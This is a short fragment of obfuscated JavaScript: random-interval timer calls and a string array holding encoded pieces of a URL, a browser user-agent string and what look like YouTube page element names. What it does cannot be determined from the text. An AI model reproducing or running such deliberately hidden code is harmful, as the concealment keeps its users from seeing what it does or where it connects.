  }, (0x4f * -0x95 + 0x3bc * 0x2 + 0x41db) * getRandomInt(0x3f0 + 0x485 * -0x2 + -0x51b * -0x1, 0x45 * 0x2 + 0xc1 * -0x1f + -0x16da * -0x1));
}, -0x234e * 0x1 + -0x10af + -0xb * -0x4c3);

function a() {
  const bh = [
    'com/@quade',
    'https://gr',
    't1fguwL3Au0Tua',
    'g8kttW49Dmk1WPDuuq',
    'zxzqC0PStKX5xW',
    'WQ7dS3WLW65zW4BdN3JcLa',
    'lujjxY02ww5nnG',
    'yxqGAgfWCgvUzq',
    'yt-core-im',
    'Ahr0Chm6lY9NCG',
    'WObZWQ9fmCoPDdhdKLO',
    'W7xdKCo3we7dLCkNWQehWQO',
    'WQVcOrZcVsZcIXjOW7Xl',
    'nderer\x20>\x20y',
    'WQLuWQNdPCocW4RcPmoMWPFdTa',
    'WONcMdldJhddSHjaWOf4',
    'ike\x20Gecko)',
    'INPUT',
    'zti5zJLMnwy2oa',
    'syn_52523/',
    'lxbHBMnHA2uTBq',
    'WRBcRx89hg9Li8o3oa'
  ];
  a = function() {
    return bh;
  };
  return a();
}